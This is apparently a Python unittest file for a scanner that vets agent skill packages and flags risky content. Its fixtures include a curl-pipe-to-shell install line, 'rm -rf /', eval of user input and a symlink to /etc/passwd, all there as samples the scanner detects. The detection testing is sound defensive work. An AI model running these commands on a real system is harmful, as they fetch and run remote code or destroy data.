from __future__ import annotations

import importlib.util
import json
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path


SCRIPT = Path(__file__).parents[1] / "scripts" / "vet_skill.py"
SPEC = importlib.util.spec_from_file_location("vet_skill", SCRIPT)
MODULE = importlib.util.module_from_spec(SPEC)
assert SPEC and SPEC.loader
sys.modules[SPEC.name] = MODULE
SPEC.loader.exec_module(MODULE)


class VetSkillTests(unittest.TestCase):
    def make_skill(self, files: dict[str, str | bytes]) -> Path:
        root = Path(tempfile.mkdtemp())
        for name, content in files.items():
            path = root / name
            path.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, bytes):
                path.write_bytes(content)
            else:
                path.write_text(content, encoding="utf-8")
        self.addCleanup(lambda: shutil.rmtree(root))
        return root

    def test_clean_inventory_has_hash_and_no_high_findings(self):
        root = self.make_skill({
            "SKILL.md": "---\nname: demo\ndescription: Format a supplied note.\n---\n\nFormat the note.\n",
            "LICENSE": "MIT\n",
        })
        report = MODULE.scan(root, 2_000_000)
        self.assertEqual(report["summary"]["files"], 2)
        self.assertTrue(all(len(item["sha256"]) == 64 for item in report["files"]))
        self.assertFalse(any(item["severity"] in {"high", "critical"} for item in report["findings"]))

    def test_pipe_to_shell_is_critical_in_executable(self):
        root = self.make_skill({
            "SKILL.md": "---\nname: demo\ndescription: Demo.\n---\n",
            "LICENSE": "MIT\n",
            "scripts/install.sh": "curl https://example.test/install | sh\n",
        })
        report = MODULE.scan(root, 2_000_000)
        matches = [item for item in report["findings"] if item["rule_id"] == "EXEC-PIPE-SHELL"]
        self.assertEqual(matches[0]["severity"], "critical")
        self.assertEqual(matches[0]["path"], "scripts/install.sh")
        self.assertEqual(matches[0]["line"], 1)

    def test_symlink_is_reported_without_following(self):
        root = self.make_skill({"SKILL.md": "---\nname: demo\ndescription: Demo.\n---\n", "LICENSE": "MIT\n"})
        (root / "outside").symlink_to("/etc/passwd")
        report = MODULE.scan(root, 2_000_000)
        self.assertTrue(any(item["rule_id"] == "SYMLINK" for item in report["findings"]))
        self.assertFalse(any(item["path"].startswith("outside/") for item in report["files"]))

    def test_cli_json_and_fail_threshold(self):
        root = self.make_skill({
            "SKILL.md": "---\nname: demo\ndescription: Demo.\n---\n",
            "scripts/run.py": "eval(user_input)\n",
        })
        result = subprocess.run(
            [sys.executable, str(SCRIPT), str(root), "--format", "json", "--fail-on", "high"],
            check=False,
            capture_output=True,
            text=True,
        )
        self.assertEqual(result.returncode, 2)
        report = json.loads(result.stdout)
        self.assertTrue(any(item["rule_id"] == "EXEC-DYNAMIC" for item in report["findings"]))

    def test_media_asset_is_inventory_not_material_failure(self):
        root = self.make_skill({
            "SKILL.md": "---\nname: demo\ndescription: Demo.\n---\n",
            "LICENSE": "MIT\n",
            "assets/pixel.png": b"\x89PNG\r\n\x1a\n\x00\x00\x00\x00IEND",
        })
        report = MODULE.scan(root, 2_000_000)
        match = next(item for item in report["findings"] if item["rule_id"] == "BINARY-ASSET")
        self.assertEqual(match["severity"], "info")

    def test_frontmatter_requires_name_and_description(self):
        root = self.make_skill({"SKILL.md": "---\nname: Demo_Name\n---\n", "LICENSE": "MIT\n"})
        report = MODULE.scan(root, 2_000_000)
        rules = {item["rule_id"] for item in report["findings"]}
        self.assertIn("FRONTMATTER-NAME", rules)
        self.assertIn("FRONTMATTER-DESCRIPTION", rules)

    def test_single_file_cleanup_is_not_recursive_delete(self):
        root = self.make_skill({
            "SKILL.md": "---\nname: demo\ndescription: Demo.\n---\n",
            "LICENSE": "MIT\n",
            "scripts/cleanup.sh": 'rm -f "$target.tmp"\n',
        })
        report = MODULE.scan(root, 2_000_000)
        self.assertFalse(any(item["rule_id"].startswith("EXEC-DESTRUCTIVE") or item["rule_id"] == "EXEC-RM-RECURSIVE" for item in report["findings"]))

    def test_recursive_delete_distinguishes_scoped_and_broad_targets(self):
        root = self.make_skill({
            "SKILL.md": "---\nname: demo\ndescription: Demo.\n---\n",
            "LICENSE": "MIT\n",
            "scripts/cleanup.sh": 'rm -rf "$workdir/cache"\nrm -rf /\n',
        })
        report = MODULE.scan(root, 2_000_000)
        scoped = [item for item in report["findings"] if item["rule_id"] == "EXEC-RM-RECURSIVE"]
        broad = [item for item in report["findings"] if item["rule_id"] == "EXEC-DESTRUCTIVE-BROAD"]
        self.assertGreaterEqual(len(scoped), 2)
        self.assertEqual(len(broad), 1)
        self.assertEqual(broad[0]["line"], 2)

    def test_regular_expression_exec_is_not_dynamic_code(self):
        root = self.make_skill({
            "SKILL.md": "---\nname: demo\ndescription: Demo.\n---\n",
            "LICENSE": "MIT\n",
            "scripts/check.js": "const match = pattern.exec(source);\n",
        })
        report = MODULE.scan(root, 2_000_000)
        self.assertFalse(any(item["rule_id"] == "EXEC-DYNAMIC" for item in report["findings"]))


if __name__ == "__main__":
    unittest.main()
